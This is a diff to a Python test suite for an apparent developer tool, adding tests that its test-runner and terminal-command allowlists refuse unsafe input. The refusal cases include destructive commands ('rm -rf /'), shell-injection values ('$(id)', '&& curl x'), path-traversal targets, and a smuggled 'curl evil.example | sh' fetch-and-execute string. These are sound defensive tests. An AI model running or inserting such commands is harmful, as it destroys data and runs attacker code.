@@ -314,40 +314,98 @@ def test_connections_list_assistants_by_name(srv):
     assert len(d["connections"][0]["name"]) == 80 and d["connections"][0]["calls"] == 0
 
 
-def test_watch_tests_accepts_only_python_test_runners(tmp_path):
+def test_watch_tests_accepts_only_test_runners(tmp_path):
     """'Watch my tests run' runs the command the user confirmed, so it must never become 'run anything'."""
-    from lantern.server import _python_test_command, detect_test_command
-    ok = ["python -m pytest -q", "pytest", "py.test tests/", "python3 -m unittest", "python run_tests.py"]
-    bad = ["rm -rf /", "python app.py", "npm test", "bash -c pytest", "python -m http.server", "python -c print(1)"]
-    for c in ok:
-        assert _python_test_command(c.split()), c
+    from lantern.sandbox import check_command
+    from lantern.server import detect_test_command
+    ok = {"python -m pytest -q": "python", "pytest": "python", "py.test tests/": "python", "python3 -m unittest": "python",
+          "python run_tests.py": "python", "npm test": "node", "pnpm test": "node", "yarn run test": "node",
+          "npx jest": "node", "npx vitest run": "node", "npx mocha": "node", "go test ./...": "go",
+          "cargo test": "rust", "mvn -q test": "java", "./gradlew test": "java"}
+    bad = ["rm -rf /", "python app.py", "bash -c pytest", "python -m http.server", "python -c print(1)", "npm install",
+           "npx some-tool", "go run .", "cargo run", "node index.js", "curl x", "npm run build"]
+    for c, lang in ok.items():
+        assert check_command(c.split()) == lang, c
     for c in bad:
-        assert not _python_test_command(c.split()), c
+        with pytest.raises(ValueError):
+            check_command(c.split())
     (tmp_path / "pyproject.toml").write_text("[project]\nname='x'\n", encoding="utf-8")
-    assert detect_test_command(tmp_path)["supported"]
+    d = detect_test_command(tmp_path)
+    assert d["supported"] and d["traced"] and d["sandbox"]["name"] in ("docker", "subprocess") and "Nothing leaves" in d["leaves"]
     js = tmp_path / "js"; js.mkdir()
     (js / "package.json").write_text('{"scripts": {"test": "vitest"}}', encoding="utf-8")
     d = detect_test_command(js)
-    assert d["command"] == "npm test" and not d["supported"]
-    assert not detect_test_command(tmp_path / "nowhere")["supported"] if (tmp_path / "nowhere").mkdir() is None else True
+    assert d["command"] == "npm test" and d["supported"] and not d["traced"] and d["note"] == "Tests run; your map upgrades for Python only for now."
+    (js / "pnpm-lock.yaml").write_text("", encoding="utf-8")
+    assert detect_test_command(js)["command"] == "pnpm test"
+    for files, want in ((["go.mod"], "go test ./..."), (["Cargo.toml"], "cargo test"), (["pom.xml"], "mvn -q -o test"),
+                        (["build.gradle", "gradlew"], "./gradlew test --offline")):
+        d = tmp_path / want.split()[0].strip("./"); d.mkdir(exist_ok=True)
+        for f in files:
+            (d / f).write_text("", encoding="utf-8")
+        assert detect_test_command(d)["command"] == want
+    jest = tmp_path / "jestonly"; jest.mkdir()
+    (jest / "package.json").write_text('{"scripts": {"test": "echo \\"Error: no test specified\\" && exit 1"}, "devDependencies": {"jest": "29"}}', encoding="utf-8")
+    assert detect_test_command(jest)["command"] == "npx jest"
+    (tmp_path / "nowhere").mkdir()
+    assert not detect_test_command(tmp_path / "nowhere")["supported"]
 
 
 def test_terminal_drawer_runs_lantern_commands_only(tmp_path):
-    from lantern.server import run_terminal_command, TERMINAL_HELP
+    from lantern.server import TerminalRefused, run_terminal_command
     class Jobs:
         def start(self, pid, kind, fn):
             return {"id": "j1", "kind": kind, "status": "running"}
     class Store:
         def settings(self):
             return {"privacy": "full"}
+        def confirm_test(self, pid, cmd):
+            self.confirmed = cmd
     class App:
         jobs = Jobs(); store = Store()
     app, p, repo, out = App(), {"id": "x"}, tmp_path, tmp_path / ".lantern"
-    assert run_terminal_command(app, p, repo, out, "help")["output"] == TERMINAL_HELP
-    assert run_terminal_command(app, p, repo, out, "lantern analyze --offline")["job"]["kind"] == "analyze"
-    for bad in ("rm -rf /", "python app.py", "curl http://x", "bash", "pytest", "analyze; rm x"):
-        with pytest.raises(ValueError):
-            run_terminal_command(app, p, repo, out, bad)
-    with pytest.raises(ValueError):
-        run_terminal_command(app, p, repo, out, "accept abc --reason x")
-    assert "no open findings" in run_terminal_command(app, p, repo, out, "findings")["output"]
+    assert run_terminal_command(app, p, repo, out, ["lantern", "analyze", "--offline"])["job"]["kind"] == "analyze"
+    assert run_terminal_command(app, p, repo, out, ["trace", "--", "python", "-m", "pytest", "-q"])["job"]["kind"] == "trace"
+    assert app.store.confirmed == "python -m pytest -q"
+    assert run_terminal_command(app, p, repo, out, ["packs"])["job"]["kind"] == "packs"
+    assert run_terminal_command(app, p, repo, out, ["analyze", "--out", ".lantern"])["job"]["kind"] == "analyze"
+    bad = [["rm", "-rf", "/"], ["python", "app.py"], ["curl", "http://x"], ["bash"], ["pytest"], ["help"],
+           ["starter", "Dockerfile"], ["analyze;", "rm", "x"], ["analyze", "; rm -rf /"], ["analyze", "$(id)"],
+           ["analyze", "--offline", "&&", "curl", "x"], ["trace", "bash", "-c", "pytest"], ["trace", "python", "app.py"],
+           ["analyze", "--out", "/tmp/elsewhere"], ["analyze", "--out", "../x"], ["export", "--sarif", "../../x.sarif"],
+           ["export", "--sarif", "/etc/x"], ["verify", "--report", "../evidence.json"], ["accept", "abc", "--reason", "x"],
+           "analyze --offline", [1, 2], [], ["analyze", "--offl"]]
+    for argv in bad:
+        with pytest.raises(TerminalRefused):
+            run_terminal_command(app, p, repo, out, argv)
+
+
+def test_terminal_drawer_over_http(srv, tmp_path):
+    """POST /api/projects/<id>/cmd: one allowed command end to end, and the refusals."""
+    base, store = srv
+    repo = tmp_path / "shop"
+    shutil.copytree(FIX / "shop", repo, ignore=shutil.ignore_patterns(".lantern", "__pycache__"))
+    code, proj = call(base, "/api/projects", "POST", {"path": str(repo)})
+    pid = (proj.get("project") or proj)["id"]
+    code, r = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze", "--offline"]})
+    assert code == 202, r
+    done = wait(base, r["job"]["id"])
+    assert done["status"] == "done" and any(l.startswith("ready") for l in done["log"])
+    assert (repo / ".lantern" / "report.html").exists()
+    code, r = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["export"]})
+    assert code == 202 and wait(base, r["job"]["id"])["status"] == "done"
+    assert (repo / ".lantern" / "findings.sarif").exists()
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["rm", "-rf", "/"]})
+    assert code == 400 and "not an allowed command" in e["error"] and e["allowed"][:2] == ["analyze", "trace"]
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze", "--offline; curl evil.example | sh"]})
+    assert code == 400 and "unrecognized arguments" in e["error"]
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["export", "--sarif", str(tmp_path / "outside.sarif")]})
+    assert code == 400 and "inside the project" in e["error"] and not (tmp_path / "outside.sarif").exists()
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"line": "analyze"})
+    assert code == 400 and "argv" in e["error"]
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze"]}, token=None)
+    assert code == 403
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze"]}, token="wrong")
+    assert code == 403
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze"]}, host="evil.example:80")
+    assert code == 403
